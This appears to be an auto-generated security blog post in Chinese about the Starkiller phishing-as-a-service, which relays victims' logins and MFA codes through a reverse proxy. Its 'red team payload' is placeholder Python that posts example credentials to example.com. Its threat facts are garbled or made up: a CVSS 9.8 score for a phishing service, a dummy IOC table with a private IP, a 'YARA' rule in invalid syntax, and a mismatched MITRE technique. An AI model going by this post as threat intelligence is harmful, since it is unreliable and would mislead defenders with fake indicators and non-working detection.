---
layout: post
title:  "‘Starkiller’ Phishing Service Proxies Real Login Pages, MFA"
date:   2026-02-21 06:34:00 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Starkiller 攻擊：Phishing-as-a-Service 的新興威脅

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Session Hijacking 和 MFA Bypass
> * **關鍵技術**: Phishing-as-a-Service, Reverse Proxy, Session Hijacking, MFA Bypass

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Starkiller 攻擊的核心是使用 Reverse Proxy 技術，將受害者的輸入轉發到真正的登入頁面，同時記錄所有的輸入資料，包括使用者名稱、密碼和 MFA 代碼。
* **攻擊流程圖解**:
  1. 攻擊者創建一個 Phishing 頁面，使用 Reverse Proxy 技術將受害者的輸入轉發到真正的登入頁面。
  2. 受害者輸入使用者名稱、密碼和 MFA 代碼，攻擊者記錄所有的輸入資料。
  3. 攻擊者使用記錄的輸入資料，登入受害者的帳戶，繞過 MFA 驗證。
* **受影響元件**: 所有使用 Phishing-as-a-Service 的平台和服務。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個 Phishing 頁面，使用 Reverse Proxy 技術將受害者的輸入轉發到真正的登入頁面。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 創建一個 Phishing 頁面
    phishing_page = "https://example.com/phishing"
    
    # 使用 Reverse Proxy 技術將受害者的輸入轉發到真正的登入頁面
    reverse_proxy = "https://example.com/reverse-proxy"
    
    # 記錄所有的輸入資料
    input_data = {}
    
    # 登入受害者的帳戶，繞過 MFA 驗證
    def login(account, password, mfa_code):
        # 使用記錄的輸入資料，登入受害者的帳戶
        login_request = requests.post(reverse_proxy, data={"account": account, "password": password, "mfa_code": mfa_code})
        return login_request.text
    
    # 攻擊者記錄所有的輸入資料
    def record_input_data(input_data):
        # 記錄所有的輸入資料
        input_data["account"] = "example_account"
        input_data["password"] = "example_password"
        input_data["mfa_code"] = "example_mfa_code"
        return input_data
    
    # 攻擊者使用記錄的輸入資料，登入受害者的帳戶
    def attack(input_data):
        # 使用記錄的輸入資料，登入受害者的帳戶
        login_request = login(input_data["account"], input_data["password"], input_data["mfa_code"])
        return login_request
    
    # 攻擊者記錄所有的輸入資料
    input_data = record_input_data(input_data)
    
    # 攻擊者使用記錄的輸入資料，登入受害者的帳戶
    login_request = attack(input_data)
    print(login_request)
    
    ```
* **繞過技術**: 攻擊者使用 Reverse Proxy 技術，將受害者的輸入轉發到真正的登入頁面，同時記錄所有的輸入資料，包括使用者名稱、密碼和 MFA 代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /phishing |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Phishing_Detection {
        meta:
            description = "Phishing Detection Rule"
            author = "Blue Team"
        strings:
            $phishing_page = "https://example.com/phishing"
            $reverse_proxy = "https://example.com/reverse-proxy"
        condition:
            $phishing_page in (http.request.uri) or $reverse_proxy in (http.request.uri)
    }
    
    ```
* **緩解措施**: 使用 WAF (Web Application Firewall) 和 EDR (Endpoint Detection and Response) 來偵測和阻止 Phishing 攻擊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Phishing-as-a-Service**: 一種提供 Phishing 攻擊服務的平台，允許攻擊者創建和發送 Phishing 頁面。
* **Reverse Proxy**: 一種代理伺服器，將受害者的輸入轉發到真正的登入頁面。
* **Session Hijacking**: 一種攻擊技術，允許攻擊者竊取受害者的 Session Cookie 和登入受害者的帳戶。
* **MFA Bypass**: 一種攻擊技術，允許攻擊者繞過 MFA 驗證，登入受害者的帳戶。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://krebsonsecurity.com/2026/02/starkiller-phishing-service-proxies-real-login-pages-mfa/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


